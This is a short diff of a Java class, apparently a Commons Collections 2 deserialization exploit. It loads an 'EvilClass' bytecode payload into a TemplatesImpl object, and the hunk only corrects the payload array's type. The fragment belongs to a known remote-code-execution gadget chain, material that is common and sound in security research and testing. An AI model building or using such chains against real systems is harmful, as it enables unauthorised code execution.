@@ -8,7 +8,7 @@ import java.util.PriorityQueue;
 public class PriorityQueueCC2 {
     public static void main(String[] args) throws Exception{
 
-        byte[][] payload = Util.getExpClassFileBytes("EvilClass");
+        byte[] payload = Util.getExpClassFileBytes("EvilClass");
 
         TemplatesImpl templates = new TemplatesImpl();
         Util.setValue(templates, "_name", "v");
